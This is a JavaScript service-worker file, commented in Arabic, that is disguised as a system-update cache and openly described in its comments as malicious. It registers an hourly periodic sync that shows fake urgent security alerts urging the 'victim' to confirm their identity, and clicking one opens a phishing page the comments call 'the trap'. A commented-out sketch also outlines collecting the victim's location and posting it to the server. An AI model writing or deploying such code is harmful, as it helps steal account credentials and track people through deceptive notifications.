// service-worker.js
const CACHE_NAME = 'system-update-cache-v1';
const urlsToCache = [
    '/',
    '/index.html',
    '/manifest.json'
    // لا نضع service-worker.js هنا لمنع التعارضات أثناء التحديث
];

self.addEventListener('install', event => {
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then(cache => {
                return cache.addAll(urlsToCache);
            })
            .then(() => self.skipWaiting()) // لتفعيل الـ SW الجديد فوراً
    );
});

self.addEventListener('activate', event => {
    event.waitUntil(
        caches.keys().then(cacheNames => {
            return Promise.all(
                cacheNames.filter(cacheName => cacheName !== CACHE_NAME)
                          .map(cacheName => caches.delete(cacheName))
            );
        }).then(() => self.clients.claim()) // للسيطرة على الصفحات فوراً
    );

    // تفعيل التنبيهات الدورية
    // هذا الجزء هو الأكثر خبثاً: يرسل تنبيهات بشكل متكرر
    self.periodicsync.register('periodic-data-sync', {
        minInterval: 60 * 60 * 1000 // كل ساعة (بالمللي ثانية)
    });
});

// استقبال التنبيهات الدورية
self.addEventListener('periodicsync', event => {
    if (event.tag === 'periodic-data-sync') {
        event.waitUntil(syncDataAndSendNotification());
    }
});

async function syncDataAndSendNotification() {
    // هنا يمكن إضافة كود لسحب الموقع أو صورة جديدة وإرسالها للسيرفر
    // مثلاً:
    // const newLocation = await getGeolocationFromClient();
    // await fetch('/capture-periodic-data', { method: 'POST', body: JSON.stringify({ location: newLocation }) });

    // إرسال تنبيه خبيث للضحية بشكل دوري
    return self.registration.showNotification('تنبيه أمني عاجل!', {
        body: 'تم رصد نشاط غير معتاد. يرجى تأكيد هويتك لتجنب إغلاق الحساب.',
        icon: 'https://img.icons8.com/color/512/settings.png', // أيقونة ترس الإعدادات
        vibrate: [200, 100, 200, 100, 200], // اهتزاز لجذب الانتباه
        data: { url: 'https://web-valid-6.onrender.com/' }, // الرابط ليعود للمصيدة
        actions: [
            { action: 'confirm_identity', title: 'تأكيد الهوية الآن', icon: 'https://img.icons8.com/ios-filled/50/checked--v1.png' }
        ]
    });
}

// عند ضغط الضحية على التنبيه
self.addEventListener('notificationclick', event => {
    event.notification.close();
    event.waitUntil(
        clients.openWindow(event.notification.data.url) // يعيد الضحية لمصيدتك
    );
});

self.addEventListener('fetch', event => {
    event.respondWith(
        caches.match(event.request)
            .then(response => {
                return response || fetch(event.request);
            })
    );
});
